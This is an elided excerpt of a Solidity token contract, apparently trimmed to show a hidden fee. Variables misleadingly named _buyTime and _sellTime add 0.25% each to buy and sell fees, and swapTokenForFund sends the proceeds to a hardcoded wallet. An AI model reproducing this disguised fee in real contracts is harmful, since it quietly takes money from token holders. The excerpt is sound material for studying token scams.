...
abstract contract AbsToken is IERC20, Ownable {
    ...
    uint256 private _sellTime;
    uint256 private _buyTime;
    ...
    constructor (
        ...
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply, uint256 maxwallet,
        ...
        _tTotal = total; _buyTime = 25; _sellTime = 25;

        _maxWalletAmount = maxwallet * 10 **Decimals;
        ...
        //holderRewardCondition = 300 * 10 ** IERC20(RewardToken).decimals();
    ...
    function _transfer(
        ...
        bool takeFee;
        bool isInviter = !_swapPairList[from] && balanceOf(to) == 0 && inviter[to] == address(0);
        if(isInviter) {
            inviter[to] = from;
        }
        if(!_feeWhiteList[from] && !_feeWhiteList[to]){
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            ...
            if (_swapPairList[sender]) {
                swapFee = _buyFundFee + _buyTime + _buyDividendFee + _buyLPFee;
                airdropFeeAmount = _buyAirdropFee * tAmount / 10000;
                if(maxlimit)
                    require(balanceOf(recipient) + tAmount <= _maxWalletAmount, "ERC20: > max wallet amount");
            } else {
                swapFee = _sellFundFee + _sellTime + _sellDividendFee + _sellLPFee;
                airdropFeeAmount = _sellAirdropFee * tAmount / 10000;
            }
            uint256 deadAmount = _deadFee * tAmount / 10000;
            uint256 swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(sender, address(this), swapAmount);
            }
            uint256 inviterAmount = tAmount * _inviterFee / 10000;
            if(inviterAmount > 0){
            ...
            if (deadAmount > 0) {
                ...
                _takeTransfer(sender, _destroyAddress, deadAmount);
            }
    ...
    function setMaxTxAndWalletAmount(uint256 walletAmount, bool enable) public onlyOwner {
    ...
    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        ...
        uint256 fundFee2 = _buyTime + _sellTime;
        ...
        if (fundUsdt2 > 0) {
            USDT.transfer(0xDa3a8dAdE933bE43ed7E422289F06462855B467d, fundUsdt2);
        }
	...
	function _takeInviterFee(
        ...
        for (int256 i = 0; i < 3; i++) {
            ...
            _takeTransfer(sender, _receiveD, amount / 3);
        }
    }
    ...
    function setBuyFee(uint256 dividendFee, uint256 fundFee, uint256 fundFee2, uint256 airdropFee, uint256 lpFee, uint256 invite, uint256 dead) external onlyOwner {
...
contract TOKEN is AbsToken {
    constructor() AbsToken(
        ...
        100000000, //zong liang

        500000, //xian gou

        address(0x249aFcAC86B00587Fd7a3637776c4ce4640497A6), //yingxiao qianbao

        address(0x249aFcAC86B00587Fd7a3637776c4ce4640497A6) // shoubi qianbao
    ){
